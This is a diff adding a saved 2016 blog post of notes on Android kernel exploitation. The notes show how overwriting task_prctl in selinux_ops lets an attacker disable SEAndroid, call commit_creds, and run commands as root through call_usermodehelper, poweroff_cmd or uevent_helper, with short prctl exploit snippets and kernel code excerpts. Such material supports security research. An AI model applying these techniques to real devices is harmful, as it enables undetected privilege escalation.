@@ -1,0 +1,1119 @@
+
+<!doctype html>
+<html class="theme-next use-motion theme-next-mala">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+  <meta name="google-site-verification" content="DRmBBL5LYsJ_2wCsJIYYsBfu8hVW8DQYzmpqGMp-njU" />
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+  <link href='//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1"/>
+
+
+    <meta name="description" content="水中月.镜中花.浮华一片苍凉.." />
+
+
+
+  <meta name="keywords" content="root," />
+
+
+
+  <link rel="alternate" href="/atom.xml" title="idhyt's blog" type="application/atom+xml" />
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
+
+
+<meta name="description" content="Proposing new kernel attack technique1.Search for callable function inside FPT structure (ptmx, security_ops, default_security_ops)2.User input has to be transferred without modification (intact) // 用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Proposing new kernel attack technique">
+<meta property="og:url" content="http://blog.idhyt.com/2016/11/17/android-proposing-new-kernel-attack-technique/index.html">
+<meta property="og:site_name" content="idhyt's blog">
+<meta property="og:description" content="Proposing new kernel attack technique1.Search for callable function inside FPT structure (ptmx, security_ops, default_security_ops)2.User input has to be transferred without modification (intact) // 用">
+<meta property="og:updated_time" content="2018-03-28T09:10:38.854Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Proposing new kernel attack technique">
+<meta name="twitter:description" content="Proposing new kernel attack technique1.Search for callable function inside FPT structure (ptmx, security_ops, default_security_ops)2.User input has to be transferred without modification (intact) // 用">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mala',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> Proposing new kernel attack technique | idhyt's blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-71783676-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?5228d77c5752954f270fcca0908555af";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">云淡风轻</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu menu-left">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br />
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            <i class="menu-item-icon icon-next-categories"></i> <br />
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br />
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br />
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            <i class="menu-item-icon icon-next-about"></i> <br />
+            About
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <form class="site-search-form">
+    <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
+  </form>
+
+
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install', 'sVJDxDCDcUGeK1KkM6zN','2.0.0');
+</script>
+
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    
+      
+
+      
+        <style type="text/css">
+
+    .circle {
+        width: 40px;
+        height: 40px;
+        background: #555 no-repeat;
+        cursor: move;
+    }
+
+    .assist-btn {
+        position: fixed;
+        top: 50％;
+        left: 10px;
+        -moz-border-radius: 50px;
+        -webkit-border-radius: 50px;
+        border-radius: 50px;
+        outline: none;
+        border: none;
+        color: #87daff;
+    }
+
+</style>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+<script type="text/javascript">
+    // 浮动圆点展开与收缩
+    /*
+    $(function () {
+        var assist_box = $('.assist-box');
+        $('#assist_btn').hover(function () {
+            assist_box.stop().show(300);
+        }, function () {
+            assist_box.stop().hide(150);
+        })
+    });
+    */  
+    //浮动圆点拖动
+    $(function () {
+        var box = document.getElementById('assist_btn');
+        box.onmousedown = function (event) {
+            var e = event || window.event,
+                t = e.target || e.srcElement,
+                // 鼠标按下时的坐标x1,y1
+                x1 = e.clientX,
+                y1 = e.clientY,
+                //鼠标按下时的左右偏移量
+                dragLeft = this.offsetLeft,
+                dragTop = this.offsetTop;
+
+            document.onmousemove = function (event) {
+                var e = event || window.event,
+                    t = e.target || e.srcElement,
+                    // 鼠标移动时的动态坐标
+                    x2 = e.clientX,
+                    y2 = e.clientY,
+                    // 鼠标移动时的坐标的变化量
+                    x = x2 - x1,
+                    y = y2 - y1;
+                box.style.left = (dragLeft + x) + 'px';
+                box.style.top = (dragTop + y) + 'px';
+            }
+
+            document.onmouseup = function () {
+                this.onmousemove = null;
+            }
+        }
+    });
+
+/*
+    $whitesmoke   = #f5f5f5
+    $gainsboro    = #eee
+    $gray-lighter = #ddd
+    $grey-light   = #ccc
+    $grey         = #bbb
+    $grey-dark    = #999
+    $grey-dim     = #666
+    $black-light  = #555
+    $black-deep   = #222
+    $red          = #ff2a2a
+    $blue-bright  = #87daff
+    $blue         = #0684bd
+    $blue-deep    = #262a30
+*/
+    // white theme
+    var body = {color: "#555", background: "white"};
+    var a_tag = {color: "#222"};
+    var header = { background: "#f5f5f5"};
+    var logo_line_i = {background: "#222"};
+    // var post_code = {background: "#eee", color: "#222"};
+
+    function switch_theme() {
+        $("body").css(body);
+        $("a:not('.links-of-author-item a, .site-state-item a, .site-state-posts a, .feed-link a, .motion-element a, .post-tags a, .show-commit-cls a, #donate_board a')").css(a_tag);
+        $(".header, .footer").css(header);
+        $(".logo-line-before i, .logo-line-after i").css(logo_line_i);
+        //$(".post code").css(post_code);
+        $("#idhyt-surprise-ball #idhyt-surprise-ball-animation .drag").css(a_tag);
+        $(".post-title-link, .posts-expand .post-meta, .post-comments-count, .disqus-comment-count, .post-category a, .post-nav-next a, .post-nav-item a").css(a_tag);
+        
+        // $("code").css({color: '#c5c8c6', background: '#1d1f21'});
+        $("#assist_btn").hide(1500);
+    }
+
+    $(function () {
+        $("#assist_btn").dblclick(function() {
+            switch_theme();
+        });
+    });
+
+</script>
+
+<div>
+
+    <button class="assist-btn circle" id="assist_btn" title="双击切换">
+        亮
+    </button>
+
+</div>
+
+
+
+
+
+
+
+
+
+      
+
+    
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              Proposing new kernel attack technique
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          Posted on
+          <time itemprop="dateCreated" datetime="2016-11-17T17:09:23+08:00" content="2016-11-17">
+            2016-11-17
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; In
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/android/" itemprop="url" rel="index">
+                  <span itemprop="name">android</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2016/11/17/android-proposing-new-kernel-attack-technique/#comments" itemprop="discussionUrl">
+              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/11/17/android-proposing-new-kernel-attack-technique/" itemprop="commentsCount"></span>
+            </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><h1 id="Proposing_new_kernel_attack_technique">Proposing new kernel attack technique</h1><p>1.Search for callable function inside FPT structure (ptmx, security_ops, default_security_ops)<br>2.User input has to be transferred without modification (intact) // 用户输入不能被修改，必须被完整的输入。</p>
+<p>Select function pointer(within kernel) to call without ROP</p>
+<p>1.task_prctl function pointer from selinux_ops meets all criteria<br>2.5 user inputs were passed though without modification</p>
+<p>kernel/sys.c:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="keyword">int</span>, option, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg3,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span>, arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">struct</span> task_struct *me = current;</span><br><span class="line">	<span class="keyword">struct</span> task_struct *tsk;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line">	<span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">	error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">	<span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	error = <span class="number">0</span>;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="PXN_bypass_attack_without_ROP">PXN bypass attack without ROP</h2><h3 id="When_only_partial_memory_value_can_be_increased/decresed">When only partial memory value can be increased/decresed</h3><p>CVE-2013-2094 perf_event_open</p>
+<p>1.call reset_security_ops by increasing address of cap_task_prctl<br>2.call commit_creds<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Direction Type Address                         Text                        </span><br><span class="line">--------- ---- -------                         ----                        </span><br><span class="line">Up        p    ____call_usermodehelper+<span class="number">130</span>     BL              commit_creds</span><br><span class="line">Up        p    set_current_groups+<span class="number">38</span>           BL              commit_creds</span><br><span class="line">Up        p    install_exec_creds+<span class="number">20</span>           BL              commit_creds</span><br><span class="line">Up        p    keyctl_change_reqkey_auth+<span class="number">50</span>    BL              commit_creds</span><br><span class="line">Up        p    keyctl_set_reqkey_keyring+<span class="number">98</span>    BL              commit_creds</span><br><span class="line">Up        p    join_session_keyring+<span class="number">90</span>         BL              commit_creds</span><br><span class="line">Up        p    join_session_keyring+<span class="number">118</span>        BL              commit_creds</span><br><span class="line">Up        p    lookup_user_key:loc_C0390D70    BL              commit_creds</span><br><span class="line">Up        p    lookup_user_key+<span class="number">420</span>             BL              commit_creds</span><br><span class="line">Up        p    key_replace_session_keyring+<span class="number">1</span>A0 BL              commit_creds</span><br><span class="line">          p    cap_task_prctl+<span class="number">198</span>              BL              commit_creds</span><br><span class="line">Down      p    selinux_setprocattr+<span class="number">120</span>         <span class="function">BL              commit_creds</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="title">cap_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span><br><span class="line">		   <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> cred *<span class="keyword">new</span>;</span><br><span class="line">	<span class="keyword">long</span> error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = prepare_creds();</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">changed:</span><br><span class="line">	<span class="keyword">return</span> commit_creds(<span class="keyword">new</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ROM:C0393754 cap_task_prctl</span><br><span class="line">ROM:C0393754</span><br><span class="line">ROM:C0393754                 MOV             R12, SP</span><br><span class="line">ROM:C0393758                 STMFD           SP!, &#123;R3-R6,R11,R12,LR,PC&#125;</span><br><span class="line">...</span><br><span class="line">ROM:C03938E8                 MOV             R0, R5</span><br><span class="line">ROM:C03938EC                 BL              commit_creds</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<h3 id="When_we_have_total_control_over_memory">When we have total control over memory</h3><p>CVE-2014-3153 futex_requeue<br>CVE-2013-6282 get/put_user<br>CVE-2015-0815 pipe</p>
+<p>Change the value of task_prctl within selinux_ops to kernel function address we want to call<br>1.Turn off SEAndroid and call commit_creds after calling prepare_kernel_cred<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// change task_prctl within selinux_ops to address of reset_security_ops</span></span><br><span class="line">syscall(<span class="number">172</span>); <span class="comment">/* 172 = sys_prctl */</span><span class="comment">/* reset_security_ops() call */</span></span><br><span class="line">[...]</span><br><span class="line"><span class="comment">// change task_prctl within selinux_ops to address of prepare_kernel_cred</span></span><br><span class="line">cred_addr=syscall(<span class="number">172</span>, <span class="number">0</span>); <span class="comment">/* prepare_kernel_cred(0) call */</span></span><br><span class="line">[...]</span><br><span class="line"><span class="comment">// change task_prctl within selinux_ops to address of commit_creds</span></span><br><span class="line">syscall(<span class="number">172</span>,cred_addr); <span class="comment">/* commit_creds(cred_addr) call */</span></span><br></pre></td></tr></table></figure></p>
+<p>2.Calling task_prctl after overwriting its value to the address of commit_creds<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// change task_prctl within selinux_ops to address of commit_creds</span></span><br><span class="line"><span class="comment">// we don’t need to call prepare_kernel_cred if we provide init_cred address as a parameter</span></span><br><span class="line">syscall(<span class="number">172</span>,&amp;init_cred);</span><br></pre></td></tr></table></figure></p>
+<p>3.We can indirectly call override_creds function by calling task_prctl<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// change task_prctl within selinux_ops to address of override_creds</span></span><br><span class="line">[...]</span><br><span class="line"><span class="keyword">void</span> *cred_ptr=(<span class="keyword">void</span> *)mmap(<span class="number">0x80000</span>,<span class="number">0x100</span>,...);</span><br><span class="line">*(<span class="keyword">long</span> *)&amp;cred_ptr[<span class="number">0</span>]=cred_addr;</span><br><span class="line">[...]</span><br><span class="line">syscall(<span class="number">172</span>,<span class="number">0x80000</span>);</span><br></pre></td></tr></table></figure></p>
+<h2 id="kernel_thread_command_execution">kernel thread command execution</h2><p>call_usermodehelper API</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">static inline int</span><br><span class="line">call_usermodehelper(char *path, char **argv, char **envp, int wait)</span><br><span class="line">&#123;</span><br><span class="line">	return call_usermodehelper_fns(path, argv, envp, wait,</span><br><span class="line">				       NULL, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static inline int</span><br><span class="line">call_usermodehelper_fns(char *path, char **argv, char **envp, int wait,</span><br><span class="line">			int (*init)(struct subprocess_info *info, struct cred *new),</span><br><span class="line">			void (*cleanup)(struct subprocess_info *), void *data)</span><br><span class="line">&#123;</span><br><span class="line">	struct subprocess_info *info;</span><br><span class="line">	gfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;</span><br><span class="line"></span><br><span class="line">	// Set the argument, environment variables, handlers to run within kernel memory</span><br><span class="line">	info = call_usermodehelper_setup(path, argv, envp, gfp_mask);</span><br><span class="line"></span><br><span class="line">	if (info == NULL)</span><br><span class="line">		return -ENOMEM;</span><br><span class="line"></span><br><span class="line">	call_usermodehelper_setfns(info, init, cleanup, data);</span><br><span class="line"></span><br><span class="line">	//  Register sub_info-&gt;work to khelper_wq queue</span><br><span class="line">	return call_usermodehelper_exec(info, wait);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct subprocess_info *call_usermodehelper_setup(char *path, char **argv,</span><br><span class="line">						  char **envp, gfp_t gfp_mask)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	INIT_WORK(&amp;sub_info-&gt;work, __call_usermodehelper);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void __call_usermodehelper(struct work_struct *work)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	if (wait == UMH_WAIT_PROC)</span><br><span class="line">		pid = kernel_thread(wait_for_helper, sub_info,</span><br><span class="line">				    CLONE_FS | CLONE_FILES | SIGCHLD);</span><br><span class="line">	else</span><br><span class="line">		pid = kernel_thread(____call_usermodehelper, sub_info,</span><br><span class="line">				    CLONE_VFORK | SIGCHLD);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int ____call_usermodehelper(void *data)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	retval = kernel_execve(sub_info-&gt;path,</span><br><span class="line">			       (const char *const *)sub_info-&gt;argv,</span><br><span class="line">			       (const char *const *)sub_info-&gt;envp);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// call do_execve function and execute user application</span><br><span class="line">int kernel_execve(const char *filename,</span><br><span class="line">		  const char *const argv[],</span><br><span class="line">		  const char *const envp[])</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	ret = do_execve(filename,</span><br><span class="line">			(const char __user *const __user *)argv,</span><br><span class="line">			(const char __user *const __user *)envp, &amp;regs);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Bypassing_PXN_by_calling_call_usermodehelper">Bypassing PXN by calling call_usermodehelper</h3><p>1.search for cap_task_prctl table address from security_ops structure<br>2.change cap_task_prctl value to reset_security_ops’s address<br>3.first calling prctl function will turn off SEAndroid<br>4.change cap_task_prctl value to call_usermodehelper’s address<br>5.second calling prctl function will run kernel thread command with admin priv<br>6.it runs as child process of kworker -&gt; UNDETECTABLE</p>
+<h3 id="Kernel_Protection_bypass">Kernel Protection bypass</h3><p>use codes that indirectly call call_usermodehelper APIs</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">call_modprobe</span><span class="params">(<span class="keyword">char</span> *module_name, <span class="keyword">int</span> wait)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">		<span class="string">"HOME=/"</span>,</span><br><span class="line">		<span class="string">"TERM=linux"</span>,</span><br><span class="line">		<span class="string">"PATH=/sbin:/usr/sbin:/bin:/usr/bin"</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *[<span class="number">5</span>]), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!argv)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	module_name = kstrdup(module_name, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!module_name)</span><br><span class="line">		<span class="keyword">goto</span> free_argv;</span><br><span class="line"></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">"-q"</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">"--"</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_fns(modprobe_path, argv, envp,</span><br><span class="line">		wait | UMH_KILLABLE, <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">free_argv:</span><br><span class="line">	kfree(argv);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">orderly_poweroff</span><span class="params">(<span class="keyword">bool</span> force)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> argc;</span><br><span class="line">	<span class="keyword">char</span> **argv = argv_split(GFP_ATOMIC, poweroff_cmd, &amp;argc);</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">		<span class="string">"HOME=/"</span>,</span><br><span class="line">		<span class="string">"PATH=/sbin:/bin:/usr/sbin:/usr/bin"</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line">	...</span><br><span class="line">	info = call_usermodehelper_setup(argv[<span class="number">0</span>], argv, envp, GFP_ATOMIC);</span><br><span class="line">	<span class="keyword">if</span> (info == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		argv_free(argv);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	call_usermodehelper_setfns(info, <span class="literal">NULL</span>, argv_cleanup, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	ret = call_usermodehelper_exec(info, UMH_NO_WAIT);</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>Bypassing kernel protection by calling call_usermodehelper without parameters</p>
+<p>1.orderly_poweroff seems to work pretty well<br>2.Bypassing kernel protection by calling call_usermodehelper indirectly<br>3.Change poweroff_cmd variable value to location of variable we want to run<br>4.Turn off SEAndroid and change whatever FPT to address of orderly_poweroff<br>5.At calling prctl, desired process will run as admin in kernel thread<br>6.it runs as child process of kworker -&gt; UNDETECTABLE</p>
+<h3 id="the_easiest_kernel_protection_bypass">the easiest kernel protection bypass</h3><p>Bypassing kernel protection by overwriting uevent_helper<br>1.Hotplug is automatically run by kobject_uevnet_env function<br>2.we can execute commands by overwriting uevent_helper without changing ops structure</p>
